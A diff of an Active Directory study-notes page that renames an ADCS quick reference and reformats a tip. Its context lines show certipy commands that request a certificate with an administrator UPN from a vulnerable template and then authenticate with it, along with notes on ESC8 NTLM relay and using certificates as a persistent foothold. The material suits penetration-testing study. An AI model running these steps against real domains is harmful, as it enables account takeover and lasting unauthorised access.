@@ -1,6 +1,11 @@
 ---
-title: "AD Certificate Services (ADCS)"
+title: "AD Certificate Services (ADCS) Quick Reference"
+description: "Organized Active Directory study notes and reference."
 ---
+
+{/* Generated from Active Directory/Reference/AD Certificate Services (ADCS) Quick Reference.md. Edit the Markdown source, then run scripts/sync_site.py. */}
+
+Supplementary quick reference from the existing vault site. It does not mark the module as complete.
 
 Misconfigured certificate templates (ESC1–ESC8) let low-priv users obtain certs that authenticate as anyone. Enumerate with Certipy.
 
@@ -18,6 +23,5 @@ certipy req -u USER@$DOMAIN -p PASS -ca CA-NAME -template VulnTemplate -upn admi
 certipy auth -pfx administrator.pfx -dc-ip $DC
 ```
 
-<Tip>
-ESC8 = NTLM relay to the CA's web enrollment (`certipy relay`). Certificates survive password resets, making them a durable foothold.
-</Tip>
+
+> ESC8 = NTLM relay to the CA's web enrollment (`certipy relay`). Certificates survive password resets, making them a durable foothold.
